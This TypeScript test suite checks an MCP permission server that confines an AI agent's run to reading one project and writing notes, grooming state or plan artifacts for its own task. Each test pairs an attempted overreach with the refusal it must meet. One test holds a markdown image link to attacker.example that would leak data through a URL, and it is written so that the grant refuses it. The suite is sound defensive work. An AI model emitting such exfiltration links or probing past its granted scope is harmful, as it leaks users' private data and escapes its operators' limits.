import { afterAll, beforeAll, expect, test } from 'bun:test';

import {
  createInitiative,
  createPhase,
  createProject,
  createTask,
  depend,
  fileSeed,
  LocalEngine,
  queueTask,
} from '@mimir/core';
import { createTestStore } from '@mimir/core/testing';
import type { TestStore } from '@mimir/core/testing';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';

import { ATTACH_LIMITS, createRunGrant, GRANT_SERVER, grantToolNames } from './agent-grant';
import type { RunGrantOptions } from './agent-grant';

/*
 * The run grant is a run's whole board access (ADR 0041). Every call goes
 * through a real MCP client, so input validation runs as it does when the CLI
 * calls the grant. Each test names an attack and the refusal it must meet.
 */

let fixture: TestStore;
let engine: LocalEngine;
let phase: string;
let other: { task: string; artifact: string; seed: string };
let seed: string;

beforeAll(async () => {
  fixture = await createTestStore();
  engine = new LocalEngine(fixture.store);
  const { store } = fixture;
  await createProject(store, { key: 'ENG', name: 'Engine' });
  await createProject(store, { key: 'OTH', name: 'Other' });
  const initiative = await createInitiative(store, { projectId: 'ENG', title: 'Agents' });
  phase = (await createPhase(store, { parentId: initiative.id, title: 'Runner' })).id;
  const otherInitiative = await createInitiative(store, {
    projectId: 'OTH',
    title: 'Secret plans',
  });
  const otherPhase = await createPhase(store, { parentId: otherInitiative.id, title: 'Hidden' });
  const otherTask = await createTask(store, {
    parentId: otherPhase.id,
    title: 'Other secret task',
  });
  const otherArtifact = await engine.attach({
    content: 'other secret content',
    project: 'OTH',
    title: 'Other secret artifact',
  });
  const otherSeed = await fileSeed(store, {
    kind: 'idea',
    project: 'OTH',
    title: 'Other secret seed',
  });
  other = { artifact: otherArtifact.id, seed: otherSeed.id, task: otherTask.id };
  seed = (await fileSeed(store, { kind: 'idea', project: 'ENG', title: 'An engine idea' })).id;
});

afterAll(async () => {
  await fixture.close();
});

/** A fresh todo task in ENG for one run. */
async function newTask(title = 'Groom me') {
  return (await createTask(fixture.store, { parentId: phase, title })).id;
}

/** A grant for `task`, connected to an MCP client; `row` decides what checkRow answers. */
async function grant(task: string, overrides: Partial<RunGrantOptions> = {}) {
  const state = { checks: 0, lost: 0, row: 'held' as 'held' | 'lost' };
  const server = createRunGrant({
    checkRow: async () => {
      state.checks += 1;
      return state.row;
    },
    engine,
    onLost: () => {
      state.lost += 1;
    },
    project: 'ENG',
    task,
    ...overrides,
  });
  const [serverSide, clientSide] = InMemoryTransport.createLinkedPair();
  await server.instance.connect(serverSide);
  const client = new Client({ name: 'grant-test', version: '1.0.0' });
  await client.connect(clientSide);
  /** Call one grant tool; the answer's text and whether it was refused. */
  const call = async (name: string, args: Record<string, unknown> = {}) => {
    try {
      const result = await client.callTool({ arguments: args, name });
      const content = result.content as { type: string; text: string }[];
      return {
        refused: result.isError === true,
        text: content.map((part) => part.text).join('\n'),
      };
    } catch (error) {
      // A protocol-level refusal, such as an unknown tool, is a refusal too.
      return { refused: true, text: error instanceof Error ? error.message : String(error) };
    }
  };
  return { call, client, server, state };
}

/** The node a successful call answered with. */
function json(answer: { refused: boolean; text: string }) {
  expect(answer.refused).toBe(false);
  return JSON.parse(answer.text);
}

test('the grant exposes exactly its reads and its three writes', async () => {
  const task = await newTask();
  const { client, server } = await grant(task);
  expect(server.name).toBe(GRANT_SERVER);
  const { tools } = await client.listTools();
  expect(tools.map((tool) => tool.name).toSorted()).toEqual(
    [
      'annotate',
      'artifact',
      'artifacts',
      'attach',
      'get',
      'groom',
      'list',
      'search',
      'seeds',
      'tree',
    ].toSorted(),
  );
  expect(grantToolNames.toSorted()).toEqual(
    tools.map((tool) => `mcp__${GRANT_SERVER}__${tool.name}`).toSorted(),
  );
});

test('reads answer within the run project', async () => {
  const task = await newTask('Readable task');
  const { call } = await grant(task);
  expect(json(await call('get', { id: task }))).toMatchObject({ id: task, title: 'Readable task' });
  expect(json(await call('get', { id: 'ENG' }))).toMatchObject({ id: 'ENG' });
  expect(json(await call('get', { id: seed }))).toMatchObject({ id: seed, project: 'ENG' });
  const listed = json(await call('list', { q: 'Readable' }));
  expect(listed.items.map((item: { id: string }) => item.id)).toContain(task);
  expect(json(await call('tree', {}))).toMatchObject({ id: 'ENG' });
  expect(json(await call('search', { query: 'Readable' })).items.length).toBeGreaterThan(0);
  expect(json(await call('seeds', {})).map((entry: { id: string }) => entry.id)).toContain(seed);
  expect(json(await call('artifacts', {}))).toMatchObject({ items: expect.any(Array) });
});

test('a read never reaches another project, however the id or query is phrased', async () => {
  const task = await newTask();
  const { call } = await grant(task);
  for (const id of [other.task, other.artifact, other.seed, 'OTH', 'eng-1', `${task} `, '']) {
    const answer = await call('get', { id });
    expect(answer.refused).toBe(true);
    expect(answer.text).not.toContain('secret');
  }
  expect((await call('tree', { id: 'OTH' })).refused).toBe(true);
  expect((await call('artifact', { id: other.artifact })).refused).toBe(true);
  for (const [name, args] of [
    ['list', { q: 'secret' }],
    ['search', { query: 'secret' }],
    ['artifacts', { q: 'secret' }],
    ['seeds', {}],
    ['tree', {}],
  ] as const) {
    const answer = await call(name, args);
    expect(answer.refused).toBe(false);
    expect(answer.text).not.toContain('secret');
  }
});

test('a read refuses a project argument instead of honoring it', async () => {
  const { call } = await grant(await newTask());
  for (const name of ['list', 'search', 'artifacts', 'seeds']) {
    const answer = await call(name, { project: 'OTH', query: 'secret' });
    expect(answer.refused).toBe(true);
    expect(answer.text).not.toContain('Other secret');
  }
});

test('a cross-project dependency shows neither the other task nor its title', async () => {
  const task = await newTask();
  await depend(fixture.store, task, [other.task]);
  const { call } = await grant(task);
  const answer = await call('get', { id: task });
  expect(answer.refused).toBe(false);
  expect(answer.text).not.toContain(other.task);
  expect(answer.text).not.toContain('secret');
});

test('annotate writes a note on the run task, after checking the row', async () => {
  const task = await newTask();
  const { call, state } = await grant(task);
  expect((await call('annotate', { content: 'Surveyed the code.' })).refused).toBe(false);
  expect((await call('annotate', { content: 'Again.', id: task })).refused).toBe(false);
  expect(state.checks).toBe(2);
  const node = await engine.getNode({ facets: ['annotations'], id: task });
  expect(node.annotations?.map((note) => note.content)).toEqual(['Surveyed the code.', 'Again.']);
});

test('annotate refuses any other id, unwritten and unchecked', async () => {
  const task = await newTask();
  const target = await newTask('Not the run task');
  const { call, state } = await grant(task);
  for (const id of [target, other.task, 'ENG', '']) {
    expect((await call('annotate', { content: 'stray', id })).refused).toBe(true);
  }
  expect(state.checks).toBe(0);
  const node = await engine.getNode({ facets: ['annotations'], id: target });
  expect(node.annotations ?? []).toEqual([]);
});

test('groom sets the run task grooming state with its note', async () => {
  const task = await newTask();
  const { call } = await grant(task);
  expect((await call('groom', { note: 'Ready to build.', state: 'groomed' })).refused).toBe(false);
  // The core's rules hold: needs_answers needs a note naming the questions.
  expect((await call('groom', { ids: [task], state: 'needs_answers' })).refused).toBe(true);
  expect(
    (await call('groom', { ids: [task], note: 'Which store?', state: 'needs_answers' })).refused,
  ).toBe(false);
  const node = await engine.getNode({ facets: ['annotations'], id: task });
  expect(node.grooming).toBe('needs_answers');
  expect(node.annotations?.some((note) => note.content.includes('Ready to build.'))).toBe(true);
});

test('a groom batch with one stray id is refused whole', async () => {
  const task = await newTask();
  const stray = await newTask('Stray');
  const { call, state } = await grant(task);
  expect((await call('groom', { ids: [task, stray], state: 'groomed' })).refused).toBe(true);
  expect((await call('groom', { ids: [stray], state: 'groomed' })).refused).toBe(true);
  expect((await call('groom', { ids: [], state: 'groomed' })).refused).toBe(true);
  expect(state.checks).toBe(0);
  expect((await engine.getNode({ id: task })).grooming).toBe('not_groomed');
  expect((await engine.getNode({ id: stray })).grooming).toBe('not_groomed');
});

test('groom refuses a task that has left todo', async () => {
  const task = await newTask();
  await queueTask(fixture.store, task, { harness: 'claude', session: 'operator' });
  const { call } = await grant(task);
  const answer = await call('groom', { state: 'groomed' });
  expect(answer.refused).toBe(true);
  expect(answer.text).toContain('todo');
  expect((await engine.getNode({ id: task })).grooming).toBe('not_groomed');
});

test('attach creates a plan artifact in the run project, linked only to the run task', async () => {
  const task = await newTask();
  const { call } = await grant(task);
  const created = json(
    await call('attach', {
      content: '# Survey\n\nThe runner.',
      summary: 'What I found',
      title: 'Survey',
    }),
  );
  expect(created).toMatchObject({ links: [task], project: 'ENG', tags: ['plan'], title: 'Survey' });
});

test('attach refuses links, tags, a project, or any other key', async () => {
  const task = await newTask();
  const { call, state } = await grant(task);
  const base = { content: 'x', title: 'Plan' };
  for (const extra of [
    { links: [task] },
    { links: [other.task] },
    { tags: ['plan'] },
    { project: 'OTH' },
    { id: task },
    { handles: { session: 'x' } },
  ]) {
    expect((await call('attach', { ...base, ...extra })).refused).toBe(true);
  }
  expect(state.checks).toBe(0);
  expect((await engine.artifacts({ project: 'ENG', q: 'Plan' })).items).toEqual([]);
});

test('attach refuses markdown image syntax in any field', async () => {
  const task = await newTask();
  const { call } = await grant(task);
  const image = '![x](https://attacker.example/leak?d=secret)';
  for (const args of [
    { content: image, title: 'Plan' },
    { content: 'x', summary: image, title: 'Plan' },
    { content: 'x', title: image },
    { content: 'before ![ref][1] after', title: 'Plan' },
  ]) {
    expect((await call('attach', args)).refused).toBe(true);
  }
});

test('attach refuses oversize content and a sixth artifact', async () => {
  const task = await newTask();
  const { call } = await grant(task);
  expect(
    (
      await call('attach', {
        content: 'x'.repeat(ATTACH_LIMITS.contentCharacters + 1),
        title: 'Big',
      })
    ).refused,
  ).toBe(true);
  expect(
    (await call('attach', { content: 'x'.repeat(ATTACH_LIMITS.contentCharacters), title: 'Max' }))
      .refused,
  ).toBe(false);
  for (let n = 2; n <= ATTACH_LIMITS.perRun; n += 1) {
    expect((await call('attach', { content: 'x', title: `Plan ${n}` })).refused).toBe(false);
  }
  expect((await call('attach', { content: 'x', title: 'One too many' })).refused).toBe(true);
});

test('a lost row refuses every write and tells the runner', async () => {
  const task = await newTask();
  const { call, state } = await grant(task);
  state.row = 'lost';
  expect((await call('annotate', { content: 'late note' })).refused).toBe(true);
  expect((await call('groom', { state: 'groomed' })).refused).toBe(true);
  expect((await call('attach', { content: 'x', title: 'Late plan' })).refused).toBe(true);
  expect(state.lost).toBe(3);
  const node = await engine.getNode({ facets: ['annotations'], id: task });
  expect(node.annotations ?? []).toEqual([]);
  expect(node.grooming).toBe('not_groomed');
  // Reads need no row check.
  expect((await call('get', { id: task })).refused).toBe(false);
});

test('a row check that fails refuses the write', async () => {
  const task = await newTask();
  const { call } = await grant(task, {
    checkRow: async () => {
      throw new Error('database unavailable');
    },
  });
  expect((await call('annotate', { content: 'note' })).refused).toBe(true);
  const node = await engine.getNode({ facets: ['annotations'], id: task });
  expect(node.annotations ?? []).toEqual([]);
});

test('no other Engine verb is reachable', async () => {
  const task = await newTask();
  const { call } = await grant(task);
  for (const name of [
    'create',
    'update',
    'updateArtifact',
    'start',
    'done',
    'move',
    'tag',
    'depend',
  ]) {
    expect((await call(name, { id: task })).refused).toBe(true);
  }
});
